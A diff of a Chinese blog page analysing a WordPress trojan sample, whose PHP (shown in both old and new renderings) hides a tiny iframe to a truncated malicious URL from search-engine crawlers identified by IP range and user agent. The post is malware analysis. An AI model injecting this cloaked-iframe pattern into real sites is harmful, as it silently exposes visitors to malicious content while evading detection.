@@ -21,20 +21,13 @@
   
   <title>一个 Wordpress 木马样本分析 [ 不可能不确定 ]</title>
   
-    <link rel="alternate" href="/atom.xml" title="不可能不确定">
+    <link rel="alternate" href="/atom.xml" title="不可能不确定" type="application/atom+xml">
   
   
     <link rel="shortcut icon" href="/hollow.ico">
   
   
   
-<link rel="stylesheet" href="https://cdn-1252212664.cos.ap-shanghai.myqcloud.com/css/random.css">
-<link rel="stylesheet" href="https://cdn-1252212664.cos.ap-shanghai.myqcloud.com/css/vegas.min.css">
-<link rel="stylesheet" href="https://cdn-1252212664.cos.ap-shanghai.myqcloud.com/css/highlight-railscasts.css">
-<link rel="stylesheet" href="https://cdn-1252212664.cos.ap-shanghai.myqcloud.com/css/jquery.fancybox.css">
-<link rel="stylesheet" href="https://cdn-1252212664.cos.ap-shanghai.myqcloud.com/css/iconfont/iconfont.css">
-<link rel="stylesheet" href="https://cdn-1252212664.cos.ap-shanghai.myqcloud.com/css/jquery.fancybox-thumbs.css">
-<link rel="stylesheet" href="https://cdn-1252212664.cos.ap-shanghai.myqcloud.com/css/plyr.css">
 <link rel="stylesheet" href="/css/random.css">
 <link rel="stylesheet" href="/css/vegas.min.css">
 <link rel="stylesheet" href="/css/highlight-railscasts.css">
@@ -44,7 +37,7 @@
 <link rel="stylesheet" href="/css/plyr.css">
 
   
-<meta name="generator" content="Hexo 4.2.0"></head>
+<meta name="generator" content="Hexo 5.4.0"></head>
 
 <body>
 <div class="side-navigate hide-area">
@@ -179,17 +172,20 @@
       </span>
     </p>
     
-    <p>在<a href="http://fanfou.com/statuses/JreFlCzZgyM" target="_blank" rel="noopener" title="佐拉 fanfou">饭否看到zuola说</a>得到一个<a href="http://zuola.diandian.com/post/0a3f9170-e1a0-11e0-928b-782bcb3825eb" target="_blank" rel="noopener" title="Zuola: wordpress木马样本">wordpress木马脚本</a>，于是就点了<a href="http://zuola.diandian.com/post/0a3f9170-e1a0-11e0-928b-782bcb3825eb" target="_blank" rel="noopener" title="Zuola Diandian">连接</a>，并简单的看了看这个样本。原理比较简单，先判断访问来源是否是搜索引擎的蜘蛛或bot，再确定是否显示一个有问题iframe——木马的效力也取决于这个iframe中的内容。这一小段PHP脚本也完全可以用到其它任何PHP程序中。</p>
-<p>将源代码做了个简单的整理如下：<a id="more"></a></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$bot = <span class="keyword">FALSE</span> ;</span><br><span class="line">$user_agent_to_filter = <span class="keyword">array</span>(<span class="string">'bot'</span>,<span class="string">'spider'</span>,<span class="string">'spyder'</span>... ...<span class="string">'mybloglog api'</span>);</span><br><span class="line">$stop_ips_masks = <span class="keyword">array</span>(</span><br><span class="line"><span class="keyword">array</span>(<span class="string">'216.239.32.0'</span>,<span class="string">'216.239.63.255'</span>),</span><br><span class="line"><span class="keyword">array</span>(<span class="string">'64.68.80.0'</span>  ,<span class="string">'64.68.87.255'</span>  ),</span><br><span class="line">... ... ...</span><br><span class="line">... ... ...</span><br><span class="line"><span class="keyword">array</span>(<span class="string">'72.30.0.0'</span>,<span class="string">'72.30.255.255'</span>),</span><br><span class="line"><span class="keyword">array</span>(<span class="string">'38.0.0.0'</span>,<span class="string">'38.255.255.255'</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$my_ip2long = sprintf(<span class="string">'%u'</span>,ip2long($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ( $stop_ips_masks <span class="keyword">as</span> $IPs ) &#123;</span><br><span class="line">    $first_d=sprintf(<span class="string">'%u'</span>,ip2long($IPs[<span class="number">0</span>]));</span><br><span class="line">    $second_d=sprintf(<span class="string">'%u'</span>,ip2long($IPs[<span class="number">1</span>]));</span><br><span class="line">    <span class="keyword">if</span> ($my_ip2long &gt;= $first_d &amp;amp;&amp;amp; $my_ip2long &lt;= $second_d) &#123;</span><br><span class="line">        $bot = <span class="keyword">TRUE</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($user_agent_to_filter <span class="keyword">as</span> $bot_sign)&#123;</span><br><span class="line">    <span class="keyword">if</span>(strpos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], $bot_sign) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">        $bot = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$bot) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;iframe src='</span>http:<span class="comment">//whsej........o=1' width='3' height='3'&gt;&lt;/iframe&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    <p>在<a target="_blank" rel="noopener" href="http://fanfou.com/statuses/JreFlCzZgyM" title="佐拉 fanfou">饭否看到zuola说</a>得到一个<a target="_blank" rel="noopener" href="http://zuola.diandian.com/post/0a3f9170-e1a0-11e0-928b-782bcb3825eb" title="Zuola: wordpress木马样本">wordpress木马脚本</a>，于是就点了<a target="_blank" rel="noopener" href="http://zuola.diandian.com/post/0a3f9170-e1a0-11e0-928b-782bcb3825eb" title="Zuola Diandian">连接</a>，并简单的看了看这个样本。原理比较简单，先判断访问来源是否是搜索引擎的蜘蛛或bot，再确定是否显示一个有问题iframe——木马的效力也取决于这个iframe中的内容。这一小段PHP脚本也完全可以用到其它任何PHP程序中。</p>
+<p>将源代码做了个简单的整理如下：<span id="more"></span></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$bot</span> = <span class="literal">FALSE</span> ;</span><br><span class="line"><span class="variable">$user_agent_to_filter</span> = <span class="keyword">array</span>(<span class="string">&#x27;bot&#x27;</span>,<span class="string">&#x27;spider&#x27;</span>,<span class="string">&#x27;spyder&#x27;</span>... ...<span class="string">&#x27;mybloglog api&#x27;</span>);</span><br><span class="line"><span class="variable">$stop_ips_masks</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;216.239.32.0&#x27;</span>,<span class="string">&#x27;216.239.63.255&#x27;</span>),</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;64.68.80.0&#x27;</span>  ,<span class="string">&#x27;64.68.87.255&#x27;</span>  ),</span><br><span class="line">... ... ...</span><br><span class="line">... ... ...</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;72.30.0.0&#x27;</span>,<span class="string">&#x27;72.30.255.255&#x27;</span>),</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;38.0.0.0&#x27;</span>,<span class="string">&#x27;38.255.255.255&#x27;</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$my_ip2long</span> = sprintf(<span class="string">&#x27;%u&#x27;</span>,ip2long(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ( <span class="variable">$stop_ips_masks</span> <span class="keyword">as</span> <span class="variable">$IPs</span> ) &#123;</span><br><span class="line">    <span class="variable">$first_d</span>=sprintf(<span class="string">&#x27;%u&#x27;</span>,ip2long(<span class="variable">$IPs</span>[<span class="number">0</span>]));</span><br><span class="line">    <span class="variable">$second_d</span>=sprintf(<span class="string">&#x27;%u&#x27;</span>,ip2long(<span class="variable">$IPs</span>[<span class="number">1</span>]));</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$my_ip2long</span> &gt;= <span class="variable">$first_d</span> &amp;amp;&amp;amp; <span class="variable">$my_ip2long</span> &lt;= <span class="variable">$second_d</span>) &#123;</span><br><span class="line">        <span class="variable">$bot</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$user_agent_to_filter</span> <span class="keyword">as</span> <span class="variable">$bot_sign</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(strpos(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>], <span class="variable">$bot_sign</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="variable">$bot</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$bot</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;iframe src=&#x27;</span>http:<span class="comment">//whsej........o=1&#x27; width=&#x27;3&#x27; height=&#x27;3&#x27;&gt;&lt;/iframe&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <h3 id="1、环境配置与变量声明"><a href="#1、环境配置与变量声明" class="headerlink" title="1、环境配置与变量声明"></a>1、环境配置与变量声明</h3><p>error_reporting(0)是为了保证在任何情况下都不报错。</p>
 <p>$bot是声音了一个flag，默认值为false，从后面的情况来看，这个是用来表明当前访问者是否是真正的浏览用户。</p>
-<p>$user_agent_to_filter和$stop_ips_masks，前者是一维数据，存储了一大堆需要排除的浏览器user_agent，后者是个二维数据，存储了若干个ip段，<a href="http://www.ipchecking.com/?ip=209.85.128.0&amp;check=Lookup" target="_blank" rel="noopener" title="$stop_ips_masks中的ip段">这些ip段</a>经查询，大都是搜索引擎的。</p>
+<p>$user_agent_to_filter和$stop_ips_masks，前者是一维数据，存储了一大堆需要排除的浏览器user_agent，后者是个二维数据，存储了若干个ip段，<a target="_blank" rel="noopener" href="http://www.ipchecking.com/?ip=209.85.128.0&amp;check=Lookup" title="$stop_ips_masks中的ip段">这些ip段</a>经查询，大都是搜索引擎的。</p>
 <h3 id="2、访问者ip的判断"><a href="#2、访问者ip的判断" class="headerlink" title="2、访问者ip的判断"></a>2、访问者ip的判断</h3><p>接下来，是通过ip地址和浏览器user agent来进行用户是否是普通浏览器的判断。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$my_ip2long = sprintf(<span class="string">'%u'</span>,ip2long($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ( $stop_ips_masks <span class="keyword">as</span> $IPs ) &#123;</span><br><span class="line">    $first_d=sprintf(<span class="string">'%u'</span>,ip2long($IPs[<span class="number">0</span>]));</span><br><span class="line">    $second_d=sprintf(<span class="string">'%u'</span>,ip2long($IPs[<span class="number">1</span>]));</span><br><span class="line">    <span class="keyword">if</span> ($my_ip2long &gt;= $first_d &amp;amp;&amp;amp; $my_ip2long &lt;= $second_d) &#123;</span><br><span class="line">        $bot = <span class="keyword">TRUE</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><a href="http://php.net/manual/en/function.ip2long.php" target="_blank" rel="noopener" title="ip2long：将ip地址转换为int">ip2long</a>这个函数可以将ip地址转换成一个整数，<a href="http://php.net/manual/en/function.sprintf.php" target="_blank" rel="noopener" title="PHP: sprinf">sprintf</a>(‘%u’, xxx)将这个int转换成无符号数。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$my_ip2long</span> = sprintf(<span class="string">&#x27;%u&#x27;</span>,ip2long(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ( <span class="variable">$stop_ips_masks</span> <span class="keyword">as</span> <span class="variable">$IPs</span> ) &#123;</span><br><span class="line">    <span class="variable">$first_d</span>=sprintf(<span class="string">&#x27;%u&#x27;</span>,ip2long(<span class="variable">$IPs</span>[<span class="number">0</span>]));</span><br><span class="line">    <span class="variable">$second_d</span>=sprintf(<span class="string">&#x27;%u&#x27;</span>,ip2long(<span class="variable">$IPs</span>[<span class="number">1</span>]));</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$my_ip2long</span> &gt;= <span class="variable">$first_d</span> &amp;amp;&amp;amp; <span class="variable">$my_ip2long</span> &lt;= <span class="variable">$second_d</span>) &#123;</span><br><span class="line">        <span class="variable">$bot</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://php.net/manual/en/function.ip2long.php" title="ip2long：将ip地址转换为int">ip2long</a>这个函数可以将ip地址转换成一个整数，<a target="_blank" rel="noopener" href="http://php.net/manual/en/function.sprintf.php" title="PHP: sprinf">sprintf</a>(‘%u’, xxx)将这个int转换成无符号数。</p>
 <p>foreach在$stop_ips_masks中进行循环，取二维数据中的每一个数组，$frist_d和$second_d分别存储ip段起点ip和止点ip的无符号整数值，再用接下来的if进行判断，当前访问者ip是否在$stop_ips_masks所指定的范围内，若是，则将$bot量置为true。</p>
-<h3 id="3、访问者user-agent的判断"><a href="#3、访问者user-agent的判断" class="headerlink" title="3、访问者user agent的判断"></a>3、访问者user agent的判断</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($user_agent_to_filter <span class="keyword">as</span> $bot_sign)&#123;</span><br><span class="line">    <span class="keyword">if</span>(strpos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], $bot_sign) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">        $bot = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="3、访问者user-agent的判断"><a href="#3、访问者user-agent的判断" class="headerlink" title="3、访问者user agent的判断"></a>3、访问者user agent的判断</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$user_agent_to_filter</span> <span class="keyword">as</span> <span class="variable">$bot_sign</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(strpos(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>], <span class="variable">$bot_sign</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="variable">$bot</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>这一部分的判断与ip判断类似，从$user_agent_to_filter中读取每一个值，再与浏览者的user agent进行对比，如果发现是机器人或者蜘蛛，则将$bot置为true。</p>
 <h3 id="4、放置iframe"><a href="#4、放置iframe" class="headerlink" title="4、放置iframe"></a>4、放置iframe</h3><p>if(!$bot)控制当访问者是普通浏览器时，即放置这个iframe，iframe的scr是无耻者放置乱七八糟内容的网页——chrome已经将它block了。</p>
 <h3 id="5、结论"><a href="#5、结论" class="headerlink" title="5、结论"></a>5、结论</h3><p>这个脚本可以用在任何php写成的网站中。而且，这段代码其实可以隐藏得更好，而不是这样连裤衩都不穿的裸奔。</p>
@@ -200,7 +196,7 @@
   <button class="btn-hide-toc btn-hide-toc-hide" onclick="TOCToggle()">隐藏目录</button>
   <div class="random-toc">
     <h2>目录</h2>
-    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、环境配置与变量声明"><span class="toc-text">1、环境配置与变量声明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、访问者ip的判断"><span class="toc-text">2、访问者ip的判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、访问者user-agent的判断"><span class="toc-text">3、访问者user agent的判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4、放置iframe"><span class="toc-text">4、放置iframe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5、结论"><span class="toc-text">5、结论</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E"><span class="toc-text">1、环境配置与变量声明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E8%AE%BF%E9%97%AE%E8%80%85ip%E7%9A%84%E5%88%A4%E6%96%AD"><span class="toc-text">2、访问者ip的判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E8%AE%BF%E9%97%AE%E8%80%85user-agent%E7%9A%84%E5%88%A4%E6%96%AD"><span class="toc-text">3、访问者user agent的判断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E6%94%BE%E7%BD%AEiframe"><span class="toc-text">4、放置iframe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81%E7%BB%93%E8%AE%BA"><span class="toc-text">5、结论</span></a></li></ol>
   </div>
 </div>
 
@@ -233,7 +229,7 @@
   <div id="bottom-outer">
     <div id="bottom-inner">
       Site by Stiekel using
-      <a href="http://hexo.io" target="_blank" rel="noopener">Hexo</a> & <a href="https://github.com/stiekel/hexo-theme-random" target="_blank" rel="noopener">Random</a>
+      <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/stiekel/hexo-theme-random">Random</a>
       <br>
       
         &copy;
@@ -258,12 +254,12 @@
 <div id="user-card">
   <div class="center-field">
     <img class="avatar" src="https://avatars2.githubusercontent.com/u/2735087?s=60&u=775d4033139cae6b23c593bcf59fa433224ba4e3&v=4">
-    <p id="description">不可能不确定的博主是一名程序员。</p>
+    <p id="description"></p>
     <ul class="social-icon">
   
   
     <li>
-      <a href="https://github.com/stiekel" target="_blank" rel="noopener">
+      <a target="_blank" rel="noopener" href="https://github.com/stiekel">
         
           <i class="icon iconfont github">&#xe606;</i>
         
@@ -271,7 +267,7 @@
     </li>
   
     <li>
-      <a href="https://coding.net/u/Stiekel" target="_blank" rel="noopener">
+      <a target="_blank" rel="noopener" href="https://coding.net/u/Stiekel">
         
           <i class="icon iconfont coding">&#xe607;</i>
         
@@ -279,7 +275,7 @@
     </li>
   
     <li>
-      <a href="https://twitter.com/SidCN" target="_blank" rel="noopener">
+      <a target="_blank" rel="noopener" href="https://twitter.com/SidCN">
         
           <i class="icon iconfont twitter">&#xe600;</i>
         
@@ -287,7 +283,7 @@
     </li>
   
     <li>
-      <a href="http://weibo.com/sidcn" target="_blank" rel="noopener">
+      <a target="_blank" rel="noopener" href="http://weibo.com/sidcn">
         
           <i class="icon iconfont weibo">&#xe602;</i>
         
@@ -295,7 +291,7 @@
     </li>
   
     <li>
-      <a href="http://www.douban.com/people/Stiekel/" target="_blank" rel="noopener">
+      <a target="_blank" rel="noopener" href="http://www.douban.com/people/Stiekel/">
         
           <i class="icon iconfont douban">&#xe60f;</i>
         
@@ -303,7 +299,7 @@
     </li>
   
     <li>
-      <a href="https://segmentfault.com/u/sid" target="_blank" rel="noopener">
+      <a target="_blank" rel="noopener" href="https://segmentfault.com/u/sid">
         
           <i class="icon iconfont segmentfault">&#xe611;</i>
         
@@ -361,22 +357,6 @@ if(isTriggerAnalytics) {
 
 
   
-  
-    <script src="https://cdn-1252212664.cos.ap-shanghai.myqcloud.com/js/jquery-2.2.3.min.js"></script>
-  
-    <script src="https://cdn-1252212664.cos.ap-shanghai.myqcloud.com/js/vegas.min.js"></script>
-  
-    <script src="https://cdn-1252212664.cos.ap-shanghai.myqcloud.com/js/random.js"></script>
-  
-    <script src="https://cdn-1252212664.cos.ap-shanghai.myqcloud.com/js/highlight.pack.js"></script>
-  
-    <script src="https://cdn-1252212664.cos.ap-shanghai.myqcloud.com/js/jquery.mousewheel.pack.js"></script>
-  
-    <script src="https://cdn-1252212664.cos.ap-shanghai.myqcloud.com/js/jquery.fancybox.pack.js"></script>
-  
-    <script src="https://cdn-1252212664.cos.ap-shanghai.myqcloud.com/js/jquery.fancybox-thumbs.js"></script>
-  
-    <script src="https://cdn-1252212664.cos.ap-shanghai.myqcloud.com/js/plyr.js"></script>
   
     <script src="/js/jquery-2.2.3.min.js"></script>
   
